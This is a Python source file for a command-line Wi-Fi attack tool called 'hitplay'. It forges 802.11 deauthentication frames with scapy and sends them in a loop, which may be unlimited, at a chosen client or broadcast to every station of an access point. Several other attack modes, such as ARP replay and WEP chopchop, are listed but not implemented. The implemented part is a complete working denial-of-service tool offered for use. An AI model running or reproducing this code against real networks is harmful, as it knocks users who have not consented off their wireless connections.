#!/usr/bin/env python3
# PYTHON_ARGCOMPLETE_OK

import argparse
import os
import sys
import time
import argcomplete
from argcomplete.completers import ChoicesCompleter

from pathlib import Path

SCRIPT_DIR = Path(__file__).resolve().parent
if str(SCRIPT_DIR) not in sys.path:
    sys.path.insert(0, str(SCRIPT_DIR))

from helpers import add_interface_argument, check_interface, check_mac, check_monitor

if "_ARGCOMPLETE" not in os.environ:
    from colorama import Fore
    from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth
    from scapy.all import sendp
    from helpers import check_root

# TODO: Make it run on windows
# TODO: Needs deep testing

# Still didn't decide what other tools to add beside deauth
ATTACK_DEFINITIONS = [
    ("deauth", "Deauthenticate one station.", True),
    ("fakeauth", "Fake authentication with an access point.", False),
    ("interactive", "Interactive frame selection.", False),
    ("arpreplay", "Standard ARP-request replay.", False),
    ("chopchop", "Decrypt or chopchop a WEP packet.", False),
    ("fragment", "Generate a valid keystream via fragmentation.", False),
    ("caffe-latte", "Query a client for new IVs.", False),
    ("cfrag", "Fragmentation attack against a client.", False),
    ("migmode", "Attack WPA migration mode.", False),
    ("test", "Test injection capability and link quality.", False),
]


# Deauthenticaion attack
def _create_client_attack_packets(bssid, client):
    """Create packets for client specified deauthentication attack."""
    packet_to_client = (
        RadioTap()
        / Dot11(addr1=client, addr2=bssid, addr3=bssid)
        / Dot11Deauth(reason=7)
    )

    packet_to_ap = (
        RadioTap()
        / Dot11(addr1=bssid, addr2=client, addr3=bssid)
        / Dot11Deauth(reason=7)
    )
    return [packet_to_ap, packet_to_client]


def _create_broadcast_attack_packets(bssid):
    """Create packet for broadcast deauthentication attack (DoS)"""
    broad_cast = "ff:ff:ff:ff:ff:ff"
    packet = (
        RadioTap()
        / Dot11(addr1=broad_cast, addr2=bssid, addr3=bssid)
        / Dot11Deauth(reason=7)
    )
    return [packet]


def _excute_attack_packets(interface, packets, count):
    """Excute the deauth attack with given packets"""
    print("Sending deauthentication packets... Press Ctrl+C to stop")

    sent_count = 0
    loop_forever = count == 0

    if len(packets) == 2 or len(packets) == 1:
        nbr_packets = len(packets)
    else:
        print(f"{Fore.RED}Unexpected error: Number of packets is broken !{Fore.RESET}")
        sys.exit(1)

    try:
        while loop_forever or sent_count < count:
            sendp(packets, iface=interface, verbose=False, count=1)
            sent_count += nbr_packets
            if (sent_count % 10) == 0 or sent_count == count:
                print(f"\rPackets sent: {sent_count}", end="", flush=True)
            if loop_forever:
                time.sleep(0.01)

    except KeyboardInterrupt:
        print("\nAttack stopped by user.")
    except Exception as e:
        print(f"\nError durring attack: {e}")
    finally:
        print(f"\nTotal packets sent: {sent_count}")


def _deauth_attack(interface, bssid, count, client=None):
    """
    Performs the deauthentication attack.

    :param interface: The wireless interface to use.
    :param bssid: The MAC address of the access point.
    :param client: The MAC address of the client to deauthenticate.
    :param count: The number of deauthentication packets to send.
    """
    is_monitor, _ = check_monitor(interface=interface)
    if not is_monitor:
        print(
            f"{Fore.RED}Interface is not in monitor mode (current mode: {_}).\nUse hitmon to enable monitor mode."
        )
        sys.exit(1)
    # Create packets based on attack type
    if client is not None:
        print(
            f"{Fore.GREEN}Starting deauthentication attack on {client} station in {bssid} acces point...{Fore.RESET}"
        )
        packets = _create_client_attack_packets(bssid, client)
    else:
        print(
            f"{Fore.GREEN}Starting broadcast deauthentication attack on AP {bssid}...{Fore.RESET}"
        )
        packets = _create_broadcast_attack_packets(bssid)

    _excute_attack_packets(interface, packets, count)


def main():
    art = r"""
 /$$       /$$   /$$               /$$                    
| $$      |__/  | $$              | $$                    
| $$$$$$$  /$$ /$$$$$$    /$$$$$$ | $$  /$$$$$$  /$$   /$$
| $$__  $$| $$|_  $$_/   /$$__  $$| $$ |____  $$| $$  | $$
| $$  \ $$| $$  | $$    | $$  \ $$| $$  /$$$$$$$| $$  | $$
| $$  | $$| $$  | $$ /$$| $$  | $$| $$ /$$__  $$| $$  | $$
| $$  | $$| $$  |  $$$$/| $$$$$$$/| $$|  $$$$$$$|  $$$$$$$
|__/  |__/|__/   \___/  | $$____/ |__/ \_______/ \____  $$
                        | $$                     /$$  | $$
                        | $$                    |  $$$$$$/
                        |__/                     \______/ 
"""
    parser = argparse.ArgumentParser(
        prog="hitplay",
        description=art
        + "\n\nA tool that does Deauthenticaion attack on wireless devices",
        epilog="@By NS-Guys",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    subparser = parser.add_subparsers(
        dest="attack", metavar="attack-mode", help="Attack mode"
    )
    subparser.required = True
    attack_names = [name for name, _, _ in ATTACK_DEFINITIONS]
    subparser.completer = ChoicesCompleter(attack_names)

    for name, help, implemented in ATTACK_DEFINITIONS:
        if implemented:
            help = help + " (Implemented)"
        else:
            help = help + " (Not Yet)"

        attack_parser = subparser.add_parser(name=name, help=help, description=help)
        add_interface_argument(attack_parser)
        attack_parser.set_defaults(implemented=implemented)
        if name == "deauth":
            attack_parser.add_argument(
                "-b",
                "--bssid",
                help="MAC address of the Access Point.",
            )
            attack_parser.add_argument(
                "-c",
                "--client",
                required=False,
                help="MAC address of the client.",
            )
            attack_parser.add_argument(
                "count",
                type=int,
                help="Number of deauthentication packets to send (0 for unlimited).",
            )

    argcomplete.autocomplete(parser)

    if len(sys.argv) == 1:
        parser.print_help(sys.stderr)
        sys.exit(1)

    args = parser.parse_args()

    if not getattr(args, "implemented", False):
        print(f"Attack '{args.attack}' is not implemented yet.")
        sys.exit(1)

    check_root()

    print(f"{Fore.YELLOW}Starting hitplay-ng...{Fore.RESET}")
    check_interface(args.interface)
    print(f"{Fore.YELLOW}+==============================================+{Fore.RESET}")
    print(f"{Fore.YELLOW}| Interface:{Fore.RESET} {args.interface}")
    print(f"{Fore.YELLOW}| Attack Mode:{Fore.RESET} {args.attack}")

    bssid = getattr(args, "bssid", None)
    client = getattr(args, "client", None)

    if bssid:
        check_mac(bssid)
        print(f"{Fore.YELLOW}| Target BSSID:{Fore.RESET} {args.bssid}")
    if client:
        check_mac(client)
        print(f"{Fore.YELLOW}| Target Client:{Fore.RESET} {args.client}")

    if args.attack == "deauth":
        if args.count == 0:
            count = "Infinity ∞"
        else:
            count = args.count
        print(f"{Fore.YELLOW}| Deauth Count:{Fore.RESET} {count}")
        print(f"{Fore.YELLOW}+==============================================+")
        if not bssid:
            print(
                f"{Fore.RED}Deauthentication attack requires AP mac address --bssid (-b).{Fore.RESET}"
            )
            sys.exit(1)
        if not client:
            print(
                f"{Fore.YELLOW}No client (station) mac address given. Initiating broadcast deauthentication...{Fore.RESET}"
            )

        _deauth_attack(args.interface, bssid, args.count, client)

    else:
        print(f"{Fore.RED}Attack '{args.attack}' is not implemented yet.{Fore.RESET}")


if __name__ == "__main__":
    main()
